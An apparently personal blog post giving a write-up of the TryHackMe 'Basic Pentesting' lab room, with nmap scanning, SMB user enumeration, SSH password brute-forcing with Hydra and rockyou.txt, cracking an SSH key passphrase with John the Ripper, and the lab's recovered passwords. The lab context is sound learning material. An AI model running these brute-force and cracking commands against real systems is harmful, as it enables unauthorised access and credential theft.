<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<title>
How to Warm Up my HACKING skills with TryHackMe |
jorgechato
</title>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=alternate type=application/rss+xml href=https://jorgechato.comindex.xml title=jorgechato>
<link rel=icon type=image/png href=/img/favicon.png>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="How to Warm Up my HACKING skills with TryHackMe">
<meta name=twitter:description content="TryHackMe is an online platform for learning and teaching cyber security.
It is based on completing rooms and upskill in security, all from your browser.
This is my writeup for the Basic pentesting room.">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-146816931-1','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body>
<header class="header bg-header w-full text-sm flex items-center sticky top-0 z-20">
<div class="header-wrap mx-auto flex items-center flex-auto px-4 w-full max-w-extreme">
<div class="header-left mr-5 flex flex-none items-center">
<a href=/ class="header-logo inline-block leading-none godo-tracking" data-event-category=Header data-event-action=Logo data-event-label=Click data-event-non-interaction=true>
<span class="text-2xl font-bold">jorgechato</span>
</a>
</div>
<nav class="header-center mainMenu relative flex items-center pr-5 flex-grow overflow-auto lg:overflow-visible">
<ul itemscope itemtype=http://www.schema.org/SiteNavigationElement class="nav whitespace-no-wrap hidden lg:flex">
<li itemprop=name class=ml-5>
<a itemprop=url href=https://whereisjorge.today/ class="mainMenu-link godo-tracking hover:text-primary font-medium" data-event-category=Header data-event-action=Menu data-event-non-interaction=true>
Where is jorge Today?
</a>
</li>
<li itemprop=name class=ml-5>
<a itemprop=url href=/tags/hack class="mainMenu-link godo-tracking hover:text-primary font-medium" data-event-category=Header data-event-action=Menu data-event-non-interaction=true>
Hacking
</a>
</li>
<li itemprop=name class=ml-5>
<a itemprop=url href=/tags/code class="mainMenu-link godo-tracking hover:text-primary font-medium" data-event-category=Header data-event-action=Menu data-event-non-interaction=true>
Coding
</a>
</li>
<li itemprop=name class=ml-5>
<a itemprop=url href=/author/jorge class="mainMenu-link godo-tracking hover:text-primary font-medium" data-event-category=Header data-event-action=Menu data-event-non-interaction=true>
About me
</a>
</li>
<li class="dropdown is-hoverable ml-5 hidden">
<a href=# class="mainMenu-link dropdown-trigger hover:text-primary font-medium">
<span>More</span><svg class="icon is-small transform rotate-90"><use xlink:href="#icon-arrow-forward"/></svg>
</a>
<div class="dropdown-menu whitespace-normal">
<div class=dropdown-content>
<div class=js-dropdown-menu></div>
<hr class=dropdown-divider>
<div class="js-social-media social-media social-media">
<a href=https://twitter.com/jorgechato title=undefined class="hover:text-twitter p-2 inline-block" target=_blank rel="noopener noreferrer">
<em class="fab fa-twitter" data-fa-transform=shrink--6></em>
</a>
<a href=https://github.com/jorgechato title=undefined class="hover:text-github p-2 inline-block" target=_blank rel="noopener noreferrer">
<em class="fab fa-github" data-fa-transform=shrink--6></em>
</a>
<a href=https://www.linkedin.com/in/jorgechato/ title=undefined class="hover:text-linkedin p-2 inline-block" target=_blank rel="noopener noreferrer">
<em class="fab fa-linkedin" data-fa-transform=shrink--6></em>
</a>
</div>
</div>
</div>
</li>
</ul>
</nav>
<div class="header-right flex-none flex justify-end items-center u-menu-color">
<a class="js-dark-mode button is-white items-center hidden mr-2 md:flex custom-control-input" aria-label="Dark and Light Mode">
<em class="fas fa-adjust" data-fa-transform=shrink--6></em>
</a>
<a href=javascript:; aria-label="Toggle Search" class="js-modal-button hidden godo-tracking button is-white mr-2" data-target=modal-search aria-haspopup=true data-event-category=Header data-event-action=Search data-event-label=Click data-event-non-interaction=true>
<em class="fas fa-search" data-fa-transform=shrink--6></em>
</a>
<div class="js-menu-toggle menu-burger button is-white relative ml-2 lg:hidden"><span></span><span></span><span></span></div>
</div>
</div>
</header>
<div class="nav-mob fixed inset-0 pt-16 pb-5 bg-header h-screen z-10 w-full text-center lg:hidden">
<div class="nav-mob-wrap absolute inset-0 top-16 py-5 overflow-auto flex justify-between flex-col">
<div class="py-4 flex justify-center md:hidden buttons">
<a class="js-dark-mode button is-white items-center mr-2 md:flex custom-control-input" aria-label="Dark and Light Mode">
<em class="fas fa-adjust" data-fa-transform=shrink--6></em>
</a>
</div>
<div class=py-4>
<ul>
<li>
<a href=https://whereisjorge.today/ class="block px-5 py-2 font-medium text-22 leading-tight">
Where is jorge Today?
</a>
</li>
<li>
<a href=/tags/hack class="block px-5 py-2 font-medium text-22 leading-tight">
Hacking
</a>
</li>
<li>
<a href=/tags/code class="block px-5 py-2 font-medium text-22 leading-tight">
Coding
</a>
</li>
<li>
<a href=/author/jorge class="block px-5 py-2 font-medium text-22 leading-tight">
About me
</a>
</li>
</ul>
</div>
<div class="js-social-media social-media nav-mob-social-media social-media is-inline py-4">
<a href=https://twitter.com/jorgechato title=undefined class="hover:text-twitter p-2 inline-block" target=_blank rel="noopener noreferrer">
<em class="fab fa-twitter" data-fa-transform=shrink--6></em>
</a>
<a href=https://github.com/jorgechato title=undefined class="hover:text-github p-2 inline-block" target=_blank rel="noopener noreferrer">
<em class="fab fa-github" data-fa-transform=shrink--6></em>
</a>
<a href=https://www.linkedin.com/in/jorgechato/ title=undefined class="hover:text-linkedin p-2 inline-block" target=_blank rel="noopener noreferrer">
<em class="fab fa-linkedin" data-fa-transform=shrink--6></em>
</a>
</div>
</div>
</div>
<div class="post-header px-4 mx-auto max-w-740 relative z-3 pt-8">
<div class=intro-header>
<div class=post-heading>
<div class="mb-3 text-gray-400 tracking-wider text-sm font-medium">
<a title=hack href=https://jorgechato.com/tags/hack/>
HACK
</a>&nbsp;
</div>
<h1 class="post-title text-32 md:text-4xl lg:text-44 text-title">
<span class=emoji>üå°Ô∏è</span>
How to Warm Up my HACKING skills with TryHackMe
</h1>
<div class="post-excerpt mt-6 text-22 text-gray-500">
<p>TryHackMe is an online platform for learning and teaching cyber security.
It is based on completing rooms and upskill in security, all from your browser.
This is my writeup for the Basic pentesting room.
</p>
</div>
<div class="meta hh flex items-center relative z-4 flex-auto leading-snug overflow-hidden">
<ul class="hh-author flex flex-wrap flex-none mr-3">
<li class="hh-author-item realtive">
<span class="relative block avatar is-45x45">
<a href=https://jorgechato.com/author/jorge/>
<img class="no-zoom absolute u-image block rounded-full" src="https://avatars.githubusercontent.com/u/4450555?v=4" alt="Go to the profile of Jorge">
</a>
</span>
</li>
</ul>
<div class="hh-right flex-auto overflow-hidden">
<div class="hh-author-name text-sm noWrapWithEllipsis">
<a href=https://jorgechato.com/author/jorge/>Jorge</a>
</div>
<div class="hh-date flex items-center text-gray-500 text-sm">
23 Apr 2020
<span class="bull mx-1">¬∑</span>
4 min read
</div>
</div>
</div>
</div>
</div>
</div>
<div class="post-wrap max-w-1100 relative mx-auto">
<div class="px-4 mx-auto max-w-740 relative" role=main>
<article class="article post-body" id=post-body>
<p>I have the feeling that the core of the last few articles is related to <strong><em>pentesting</em></strong> and <strong><em>hacking</em></strong>. But after discussing about integration patterns, coding and best practices all day long in my job I fond myself enjoying the hacking challenges in my spare time.</p>
<p>TryHackMe is an online platform for learning and teaching cyber security. It is based on completing rooms and upskill in security, all from your browser.</p>
<p>This article is a <strong>Writeups</strong> for the <a href=https://tryhackme.com/room/basicpentestingjt><em>Basic Pentesting</em> room</a>.</p>
<figure><img src=/img/2020/03/image.png>
</figure>
<p><strong>1Ô∏è. Deploy the machine and connect to our network</strong></p>
<p><strong>2Ô∏è. Find the services exposed by the machine</strong></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ nmap -sC -sV &lt;IP&gt;
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=c1># Nmap 7.80 scan initiated Sun Mar 22 11:26:39 2020 as: nmap -sC -sV -oN output/nmap 10.10.38.196</span>
Nmap scan report <span class=k>for</span> 10.10.38.196
Host is up <span class=o>(</span>0.077s latency<span class=o>)</span>.
Not shown: <span class=m>997</span> closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
<span class=p>|</span> ssh-hostkey:
<span class=p>|</span>   <span class=m>2048</span> db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 <span class=o>(</span>RSA<span class=o>)</span>
<span class=p>|</span>   <span class=m>256</span> 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce <span class=o>(</span>ECDSA<span class=o>)</span>
<span class=p>|</span>_  <span class=m>256</span> a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 <span class=o>(</span>ED25519<span class=o>)</span>
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
Service Info: Host: BASIC2<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
<span class=p>|</span>_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
<span class=p>|</span>_nbstat: NetBIOS name: BASIC2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class=o>(</span>unknown<span class=o>)</span>
<span class=p>|</span> smb-os-discovery:
<span class=p>|</span>   OS: Windows 6.1 <span class=o>(</span>Samba 4.3.11-Ubuntu<span class=o>)</span>
<span class=p>|</span>   Computer name: basic2
<span class=p>|</span>   NetBIOS computer name: BASIC2<span class=se>\x</span><span class=m>00</span>
<span class=p>|</span>   Domain name: <span class=se>\x</span><span class=m>00</span>
<span class=p>|</span>   FQDN: basic2
<span class=p>|</span>_  System time: 2020-03-22T06:26:54-04:00
<span class=p>|</span> smb-security-mode:
<span class=p>|</span>   account_used: guest
<span class=p>|</span>   authentication_level: user
<span class=p>|</span>   challenge_response: supported
<span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
<span class=p>|</span> smb2-security-mode:
<span class=p>|</span>   2.02:
<span class=p>|</span>_    Message signing enabled but not required
<span class=p>|</span> smb2-time:
<span class=p>|</span>   date: 2020-03-22T10:26:54
<span class=p>|</span>_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class=c1># Nmap done at Sun Mar 22 11:26:58 2020 -- 1 IP address (1 host up) scanned in 19.80 seconds</span>
</code></pre></div><p>We have 3 Open PORTS:</p>
<ul>
<li>22 (SSH)</li>
<li>139 and 445 (smbd)</li>
</ul>
<p>If we open this IP in the browser we see a server sunning.</p>
<figure><img src=/img/2020/03/image-6.png>
</figure>
<figure><img src=/img/2020/03/image-2.png>
</figure>
<p><strong>3. What is the name of the hidden directory on the web server(enter name without /)?</strong></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=c>&lt;!-- Check our dev note section if you need to know what to worck on. --&gt;</span>
</code></pre></div><p>We could use <a href=https://github.com/OJ/gobuster>gobuster</a> to search for directories with brute-force but since we have a hint here let&rsquo;s try it first&mldr; ok <code>/dev</code> isn&rsquo;t the directory we are looking for but we see an apache server running. Maybe <code>/development</code> is the right endpoint&mldr; Yes, we nailed it.</p>
<figure><img src=/img/2020/03/image-5.png>
</figure>
<figure><img src=/img/2020/03/image-7.png>
</figure>
<figure><img src=/img/2020/03/image-8.png>
</figure>
<p><strong>4. User brute-forcing to find the username & password</strong></p>
<p><strong>5. What is the username?</strong></p>
<p>We have smbd open, that can give us a lot of information. We can use Enum4linux for that. Since I don&rsquo;t have the tool installed on my machine and handling all the dependencies may be a nightmare let&rsquo;s use docker.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ docker run --rm -it enum4linux -a &lt;IP&gt;
</code></pre></div><p>2 users pop up, <strong>jan</strong> a.k.a. J and <strong>kay</strong> a.k.a. K.</p>
<p><strong>6. What is the password? + 7. What service do you use to access the server(answer in abbreviation in all caps)?</strong></p>
<p>Seen the input field we can assume the password is pretty simple, a brute force approach should unlock it.</p>
<p>We have the information about the open ports thanks the nmap tool. SSH is a great candidate with a tool called <strong><em><a href=https://tools.kali.org/password-attacks/hydra>Hydra</a></em></strong>. A common password dictionary is needed tho and we are going to use <a href=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt>rockyou.txt</a></p>
<p>Rockyou.txt contains 14,341,564 unique passwords, used in 32,603,388 accounts.</p>
<p>Kali Linux provides this dictionary file as part of its standard installation.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ hydra -l jan -P rockyou.txt ssh:&lt;ip&gt;

login: jan   password: armando
</code></pre></div><p><strong>8. Enumerate the machine to find any vectors for privilege escalation</strong></p>
<p><strong>9. What is the name of the other user you found(all lower case)?</strong></p>
<p>We already have this information from point 5.</p>
<p><strong>10. If you have found another user, what can you do with this information? + 11. What is the final password you obtain?</strong></p>
<p>Awesome, now we can login with SSH as <code>jan</code> . Listing the file in jan directory doesn‚Äôt give us any answer to escalating the privilege. Still, remember we have the user kay? Let‚Äôs find it out.</p>
<p>We found the <code>id_rsa</code> and <code>id_rsa.pub</code> and a strange file <code>pass.back</code>, unfortunately when we try to ssh using the key file we see the key requires a passphrase.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ssh -i id_rsa kay@&lt;IP&gt;

Enter passphrase <span class=k>for</span> key <span class=s1>&#39;id_rsa&#39;</span>:
</code></pre></div><p>But luckily we can cat out this file and crack the key with <a href=https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/ssh2john.py>JohnTheRipper</a></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ssh2john.py output/kay/id_rsa &gt; id_rsa.txt

$ docker run -it --rm -v <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>/id_rsa.txt:/opt/id_rsa.txt -v <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>/dic/rockyou.txt:/opt/rockyou.txt obscuritylabs/johntheripper /opt/id_rsa.txt --wordlist<span class=o>=</span>/opt/rockyou.txt
...
beeswax   <span class=o>(</span>output/kay/id_rsa<span class=o>)</span>
</code></pre></div><p>Now we can login as kay with the public key and cat the strange file we saw under the home directory for this user.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ssh -i id_rsa kay@&lt;IP&gt;

$ cat pass.back

heresareallystrongpasswordthatfollowsthepasswordpolicy<span class=nv>$$</span>
</code></pre></div><blockquote>
<p>The stream is in <strong>Spanish</strong></p>
</blockquote>
<div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden>
<iframe src=https://www.youtube.com/embed/UK9YkhEI4CU style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 allowfullscreen title="YouTube Video"></iframe>
</div>
<button onclick=topFunction() id=backtotopButton>
<em class="fa fa-angle-up"></em>
</button>
<script>document.addEventListener('scroll',function(){document.body.scrollTop>50||document.documentElement.scrollTop>50?(document.getElementById('backtotopButton').style.opacity='1',document.getElementById('backtotopButton').style.transition='0.5s'):(document.getElementById('backtotopButton').style.opacity='0',document.getElementById('backtotopButton').style.transition='0.5s')});function topFunction(){document.body.scrollTop=0,document.documentElement.scrollTop=0}</script>
<div class="post-tags mb-8">
<div class=buttons>
<a class="button is-light font-medium text-sm capitalize godo-tracking" href=https://jorgechato.com/tags/hack/>
hack
</a>&nbsp;
</div>
</div>
</article>
<div class="prev-next pb-8">
<hr class=my-10>
<div class="flex relative godo-tracking mb-8" data-event-category=Article data-event-action="Previous article" data-event-non-interaction=true>
<div class="prev-next-body pl-6 flex-auto">
<a href=https://jorgechato.com/my-toolset/>
<div class="text-sm leading-none text-gray-500 mb-2 font-medium">Previous article</div>
<h2 class="prev-next-title text-title mb-2 text-xl md:text-22">
üõ†Ô∏è
My TOOLSET
</h2>
<p class="prev-next-excerpt text-base text-gray-500 lineClamp-2 leading-snug">
I always been fascinated with others workflow and daily toolset, learning from your peers and share your daily struggles is a good exercise to improve.
</p>
</a>
</div>
</div>
</div>
</div>
</div>
<footer class="footer-light py-10 lg:pt-16 text-center lg:text-left">
<div class="mx-auto max-w-extreme px-4">
<div class="flex flex-col lg:flex-row justify-between">
<div class="footer-copy text-sm order-3 mt-8 flex-none lg:text-left lg:order-none lg:mt-0">
&copy; 2020
<a href=https://jorgechato.com>jorgechato</a>.
All rights reserved.
<div class=mt-2>
Design with <span class="icon animated infinite pulse">‚ù§Ô∏è</span>by
<a href=https://jorgechato.com/ class=link>@JorgeChato</a>.
<a href=https://github.com/jorgechato/hution>Hution</a> Theme.
</div>
</div>
<div class="js-social-media social-media footer-social-media mt-8 flex-none lg:mt-0 is-inline">
<div class="js-social-media social-media footer-social-media flex-none lg:mt-0 is-inline">
<a href=https://twitter.com/jorgechato target=_blank class="hover:text-twitter p-2 inline-block" name=twitter>
<em class="fab fa-twitter" data-fa-transform=shrink--6></em>
</a>
<a href=https://github.com/jorgechato target=_blank class="hover:text-github p-2 inline-block" name=github>
<em class="fab fa-github" data-fa-transform=shrink--6></em>
</a>
<a href=https://www.linkedin.com/in/jorgechato/ target=_blank class="hover:text-linkedin p-2 inline-block" name=linkedin>
<em class="fab fa-linkedin" data-fa-transform=shrink--6></em>
</a>
<link rel=stylesheet href=https://jorgechato.com/css/main.css>
<link rel=stylesheet href=https://jorgechato.com/css/base.css>
<link rel=stylesheet href=https://jorgechato.com/css/github.css>
<link rel=stylesheet href=https://jorgechato.com/css/zooming.css>
<script>let darkMode=localStorage.getItem("theme");darkMode==='dark'&&document.documentElement.classList.add('dark')</script>
<script src=https://jorgechato.com/js/main.js></script>
<script src=https://jorgechato.com/js/zooming.min.js></script>
<script src=https://jorgechato.com/js/fontawesome.all.min.js></script>
<script>document.addEventListener('DOMContentLoaded',function(){new Zooming({bgColor:"var(--bg)",bgOpacity:.5,scaleBase:.9}).listen('figure>img:not(.no-zoom)')})</script>
<meta name=generator content="Hugo 0.90.1">
</div>
</div>
</footer>
</body>
</html>